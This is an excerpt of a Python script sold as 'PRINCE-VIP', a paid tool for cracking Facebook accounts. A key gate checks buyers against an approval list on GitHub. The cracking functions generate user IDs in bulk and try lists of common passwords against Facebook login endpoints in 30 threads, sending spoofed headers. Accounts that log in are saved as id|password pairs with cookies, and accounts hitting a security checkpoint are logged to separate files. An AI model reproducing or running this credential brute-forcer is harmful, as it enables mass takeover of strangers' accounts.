...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get(f"https://raw.githubusercontent.com/PRINCE-BRAND/PRINCE-VIP/main/Approval.txt").text
  
 

  os.system(f" clear")                          
  print(f"""
\033[92;1m➤➤⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃\033[1;33mPRINCE x AFTAB\033[1;35m⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤➤
\033[97;1m██████╗░██████╗░██╗███╗░░██╗░█████╗░███████╗ P   A
\033[96;1m██╔══██╗██╔══██╗██║████╗░██║██╔══██╗██╔════╝ R   F
\033[93;1m██████╔╝██████╔╝██║██╔██╗██║██║░░╚═╝█████╗░░ I   T
\033[94;1m██╔═══╝░██╔══██╗██║██║╚████║██║░░██╗██╔══╝░░ N   A
\033[97;1m██║░░░░░██║░░██║██║██║░╚███║╚█████╔╝███████╗ C   B
\033[91;1m╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝ E
\033[92;1m➤➤⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃\033[1;33mPRINCE x PRINCE\033[1;35m⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤➤
\033[33m【✪】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃\033[1;32m⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;32m【✪】Cʀᴇᴀᴛᴇᴅ Bʏ   ✯  👑\033[1;33mPRINCE x AFTAB👑   
\033[1;32m【✪】FB Gʀᴏᴜᴘ     ✯  \033[1;33mCOMMING SOON... 
\033[1;32m【✪】Oɴ Gɪᴛʜᴜʙ    ✯  \033[1;33mPRINCE-BRAND  
\033[1;32m【✪】Tᴏᴏʟ SᴛᴀᴛᴜS  ✯  \033[1;91mPAID  
\033[1;32m【✪】Tᴏᴏʟ Vᴇʀsɪᴏɴ ✯  1.5  
\033[33m【✪】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃\033[1;32m⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤\n""")                             
  print(f"\t \033[1;32mFIRST GET APPROVEL\033[1;37m")
  print(f"")
  print(f"\033[1;32mTHIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print(f"")
  print(f"\x1b[1;92mcontract Admin to Buy this Tools");time.sleep (0.1) 
  print(f"")
  print(f"\033[1;32YOUR  KEY : "+id)
  print(f"")
  print(f"\033[1;31mCOPY YOUR KEY AND SEND TO ADMIN");time.sleep(0.1)
  print(f"")
  print(f"Follow Admin Facebook ID,,,,,,,,,,,,,,,,,");time.sleep(1)
  os.system(f'xdg-open https://www.facebook.com/profile.php?id=100000234421275')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34mCHECKING YOUR APROVAL.............");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"https://raw.githubusercontent.com/PRINCE-BRAND/PRINCE-VIP/main/Approval.txt").text
    if id in httpCaht:
      print(f"\033[1;92mYOUR KEY APROVED");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print(f"\x1b[1;92mSorry Bro Your Key is not Aproved")
      print(f"Send payment to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open {tan}://www.facebook.com/profile.php?id=100000234421275?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def Spy():
	clear()
	ckx()
	print(f" [1] FILE Cloner (LUSH) ")
	print(f" [2] BD Random Cloner ")
	print(f" [3] Gmail Cloning")
	print(f" [4] Pak Random")
	print(f" [0] Exit")
	me=input(f' Choice : ')
	if me in ["2", "02"]:
		os.system(f"python /sdcard/a/a1/boss.py")
		#bd()
	if me in ["3","03"]:
		gml()
	if me in ["1", "01","11","A","a"]:
		...
		try:
			...
			exit()
		print(f' [1] Method 1 (Lush) \n [2] Method 2 \n [3] Method 3 \n [4] Method 4 \n [5] Method 5 \n [6] Method 6 \n [7] Method 7 \n [8] Method 8 (not working)')
		mthd=input(f' Choose: ')
		plist=[]
		try:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [PRINCE-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [PRINCE-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/PRINCE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [PRINCE-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/PRINCE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [PRINCE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [PRINCE-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/PRINCE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'pakistan','bangladesh','i love you','@#@#@#','123890']
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  PRINCE, Azaan, Ayaan, Billal')
...
def rcrack_free(idf,pwv):
    ...
    'x-fb-request-id': 'ANP8ckt3MNLp_il4tIaIV2I',
    'x-fb-trace-id': 'BZ4utAYllBs',
    'x-fb-rev': '1007041397',
    'x-fb-debug': 'BXJi9NVTPgFbHP/ptBv44HIWPbHJI8WmXR1nlVJBxWlmkqRUWg2txQrXcFiVd8AeCvfIMPhRdsqsXV34I/tUWg==',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
			...
			lo = session.post('https://developer.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[PRINCE-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[PRINCE-CP] '+idf+' | '+ps+'\033[0;97m')
